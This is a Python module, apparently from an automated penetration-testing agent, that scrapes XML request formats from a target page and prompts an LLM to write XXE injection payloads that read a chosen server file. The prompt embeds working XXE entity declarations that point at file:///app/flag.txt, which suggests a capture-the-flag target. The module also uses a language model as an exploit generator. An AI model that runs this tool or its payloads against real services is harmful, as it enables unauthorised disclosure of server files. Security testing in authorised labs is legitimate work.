"""
XXE LLM Payload Generator - Uses LLM to generate custom XXE payloads

Follows the same pattern as XSS LLM payload generation with Bedrock/OpenRouter
"""
import os
import re
import sys
from pathlib import Path
from typing import List, Dict, Optional

# Add src directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from xss_agent.llm_client import get_llm_client, get_default_model


class XXELLMGenerator:
    """Uses LLM to generate context-aware XXE payloads"""

    def __init__(self, llm_client=None):
        """
        Initialize XXE LLM generator

        Args:
            llm_client: Optional LLM client (will create one if not provided)
        """
        self.llm_client = llm_client or get_llm_client()
        self.model = get_default_model()

    async def generate_custom_payloads(
        self,
        page_content: str,
        target_file: str,
        endpoint_url: str,
        max_payloads: int = 5
    ) -> List[str]:
        """
        Generate custom XXE payloads based on page analysis

        Args:
            page_content: HTML/JavaScript content from the page
            target_file: File path to read (e.g., /app/flag.txt)
            endpoint_url: Target SOAP/XML endpoint
            max_payloads: Maximum number of payloads to generate

        Returns:
            List of custom XXE payload strings
        """
        # Extract XML examples from page
        xml_examples = self._extract_xml_from_page(page_content)

        print(f"    📝 Extracted {len(xml_examples)} XML example(s) from page")
        for i, xml in enumerate(xml_examples[:2], 1):
            preview = xml[:100].replace('\n', ' ')
            print(f"       Example {i}: {preview}...")

        # Build prompt for LLM
        prompt = self._build_generation_prompt(
            xml_examples=xml_examples,
            target_file=target_file,
            endpoint_url=endpoint_url,
            max_payloads=max_payloads
        )

        try:
            print(f"    🤖 Generating {max_payloads} custom XXE payloads with LLM...")

            # Call LLM to generate payloads
            messages = [{"role": "user", "content": prompt}]

            response = self.llm_client.chat_completion(
                model=self.model,
                messages=messages,
                max_tokens=4096,
                temperature=0.7
            )

            response_text = response["choices"][0]["message"]["content"]

            # Parse payloads from response
            payloads = self._parse_payloads_from_response(response_text)

            print(f"    ✓ Generated {len(payloads)} XXE payload(s)")
            return payloads[:max_payloads]

        except Exception as e:
            print(f"    ⚠️  LLM generation failed: {str(e)[:100]}")
            return []

    def _extract_xml_from_page(self, page_content: str) -> List[str]:
        """
        Extract XML examples from page content

        Args:
            page_content: HTML/JavaScript content

        Returns:
            List of XML example strings
        """
        xml_examples = []

        # Pattern 1: XML in JavaScript strings (template literals, strings)
        # Match: `<SomeRequest>...</SomeRequest>` or "<SomeRequest>...</SomeRequest>"
        js_xml_patterns = [
            r'`\s*(<[A-Z][^>]+>.*?</[A-Z][^>]+>)\s*`',  # Template literals
            r'["\'](\s*<[A-Z][^>]+>.*?</[A-Z][^>]+>)\s*["\']',  # Quoted strings
            r'(?:const|let|var)\s+\w+\s*=\s*`([^`]*<[A-Z][^>]+>.*?</[A-Z][^>]+>[^`]*)`',  # Variable assignments
        ]

        for pattern in js_xml_patterns:
            matches = re.findall(pattern, page_content, re.DOTALL)
            for match in matches:
                # Clean up the XML
                xml = match.strip()
                if self._looks_like_xml(xml):
                    xml_examples.append(xml)

        # Pattern 2: XML elements in general (fallback)
        if not xml_examples:
            # Look for any XML-like structures with capital letter tags
            generic_pattern = r'(<[A-Z][a-zA-Z0-9_]+(?:\s+[^>]*)?>(?:.*?)</[A-Z][a-zA-Z0-9_]+>)'
            matches = re.findall(generic_pattern, page_content, re.DOTALL)
            for match in matches:
                xml = match.strip()
                if self._looks_like_xml(xml) and len(xml) < 2000:
                    xml_examples.append(xml)

        # Remove duplicates while preserving order
        seen = set()
        unique_examples = []
        for xml in xml_examples:
            # Normalize for comparison
            normalized = re.sub(r'\s+', ' ', xml).strip()
            if normalized not in seen and len(normalized) > 10:
                seen.add(normalized)
                unique_examples.append(xml)

        return unique_examples[:5]  # Limit to top 5 examples

    def _looks_like_xml(self, text: str) -> bool:
        """Check if text looks like valid XML"""
        # Must start with < and have matching tags
        if not text.strip().startswith('<'):
            return False

        # Check for basic XML structure
        if not re.search(r'<[A-Z][a-zA-Z0-9_]+', text):
            return False

        # Should have closing tags
        if not re.search(r'</[A-Z][a-zA-Z0-9_]+>', text):
            return False

        return True

    def _build_generation_prompt(
        self,
        xml_examples: List[str],
        target_file: str,
        endpoint_url: str,
        max_payloads: int
    ) -> str:
        """Build prompt for LLM payload generation"""

        prompt = f"""You are a security researcher testing for XXE (XML External Entity) vulnerabilities.

TARGET: {endpoint_url}
GOAL: Read the file {target_file} using XXE injection

"""

        if xml_examples:
            prompt += f"""DISCOVERED XML FORMATS:
The application uses these XML formats (found in page source):

"""
            for i, xml in enumerate(xml_examples, 1):
                prompt += f"Example {i}:\n```xml\n{xml}\n```\n\n"

            prompt += f"""TASK:
Generate {max_payloads} XXE injection payloads that:
1. MATCH the discovered XML format(s) above (use the same element names and structure)
2. Include XXE entity declaration to read {target_file}
3. Place the entity reference (&xxe;) in different fields that might be processed
4. Use variations of XXE techniques:
   - Basic file disclosure: <!ENTITY xxe SYSTEM "file://{target_file}">
   - With ISO encoding: <?xml version="1.0" encoding="ISO-8859-1"?>
   - Alternative DOCTYPE positions
   - Different entity names

IMPORTANT:
- Keep the exact element names from the examples (e.g., <GetAccountInfoRequest>, <account_id>)
- The server expects specific XML formats, so match them precisely
- Place &xxe; in text content of elements (not attributes)
- Ensure proper XML structure with DTD/DOCTYPE declarations

"""
        else:
            prompt += f"""No specific XML format discovered. Generate {max_payloads} generic XXE payloads for common SOAP/XML services:

- GetAccountInfoRequest / account_id
- GetUserRequest / user_id
- SearchRequest / query
- LoginRequest / username
- Generic request/data structures

Include XXE entity to read {target_file}

"""

        prompt += """OUTPUT FORMAT:
Return ONLY the XML payloads, separated by:
---PAYLOAD---

Example output:
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<GetAccountInfoRequest>
    <account_id>&xxe;</account_id>
</GetAccountInfoRequest>
---PAYLOAD---
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<GetAccountHolderRequest>
    <holder_id>&xxe;</holder_id>
</GetAccountHolderRequest>
---PAYLOAD---

Do NOT include explanations, just the payloads.
"""

        return prompt

    def _parse_payloads_from_response(self, response_text: str) -> List[str]:
        """
        Parse XXE payloads from LLM response

        Args:
            response_text: LLM response text

        Returns:
            List of payload strings
        """
        payloads = []

        # Split by separator
        if '---PAYLOAD---' in response_text:
            parts = response_text.split('---PAYLOAD---')
            for part in parts:
                payload = part.strip()
                # Remove code block markers if present
                payload = re.sub(r'^```(?:xml)?\n?', '', payload)
                payload = re.sub(r'\n?```$', '', payload)
                payload = payload.strip()

                if payload and self._looks_like_xml(payload):
                    payloads.append(payload)
        else:
            # Try to extract XML from code blocks
            code_blocks = re.findall(r'```(?:xml)?\n?(.*?)\n?```', response_text, re.DOTALL)
            for block in code_blocks:
                block = block.strip()
                if self._looks_like_xml(block):
                    payloads.append(block)

            # If no code blocks, try to find XML directly
            if not payloads:
                xml_pattern = r'(<\?xml.*?</[A-Za-z0-9_]+>)'
                matches = re.findall(xml_pattern, response_text, re.DOTALL)
                for match in matches:
                    match = match.strip()
                    if self._looks_like_xml(match):
                        payloads.append(match)

        return payloads
